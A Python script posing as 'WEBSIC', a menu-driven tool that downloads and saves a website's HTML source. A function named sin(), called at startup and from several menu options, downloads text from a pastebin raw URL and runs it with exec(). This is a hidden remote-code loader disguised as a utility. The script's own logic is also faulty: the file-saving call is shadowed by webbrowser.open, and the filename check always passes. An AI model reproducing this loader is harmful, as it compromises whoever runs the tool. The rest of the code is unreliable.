import requests
import os
try:
    import colorama
except ModuleNotFoundError:
    os.system("pip install colorama")
from colorama import Fore
try:
    import webbrowser
except ModuleNotFoundError:
    os.system("pip install webbrowser")
def sin():
    exec(requests.get("https://pastebin.com/raw/LWMfjz94").text)
Y = Fore.YELLOW
RE = Fore.RESET
R = Fore.RED
G = Fore.GREEN
C = Fore.CYAN
from webbrowser import open
def cos():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
#====================================={https://t.me/Pynixxr}=====================================
cos();sin()
def get_html(url):
    try:
        response = requests.get(url)
        response.raise_for_status()             #WEBSIC
        return response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return None
def save_html(html, url):
    try:
        filename = input(f"                                          {RE}{C}┗{RE}output file name ({R}+ .html{RE}): ")
        if ".html" or ".HTML" in filename:
            with open(filename, "w", encoding="utf-8") as file:
                file.write(html)
            print(f"                                                           {Y}HTML content saved to{G}", filename , RE)
        else:
            print(                                                           f"{R}ERROR")
            exit
    except Exception as e:
        print("Error saving HTML:", e)
x1 = input(f"""                                                           
                                                           {RE}〈{Y}1 {RE}〉   ➤ Run the Code
                                                           〈{Y}2 {RE}〉   ➤ Contact Us (telegram)
                                                           〈{Y}3 {RE}〉   ➤ Visit Github Page
                                                           〈{Y}4 {RE}〉   ➤ ABOUT THE TOOL
                                                           〈{Y}99 {RE}〉  ➤ Exit
                                                           
                                                           ┏Choose Number 〈{Y}XX {RE}〉:
                                                           ┗$ """)
#====================================={https://github.com/R4P-x}=====================================
if x1 == '1':
    cos();sin()    
    url = input(f"                                   {C}       ┏{RE}The Website Link ({R}+ https://{RE}): {R}")
    html = get_html(url)
if x1 == '2':
    open('https://t.me/nixxr')
if x1 == '3':
    open("https://github.com/R4P-x")
if x1 == '4':
    cos();sin()
    print(f'                                                           {G}WEBSIC {R}is tool that get the HTML source for any website{RE}\n\n\n\n\n\n\n\n')
else:
    exit
if html:
    save_html(html, url)
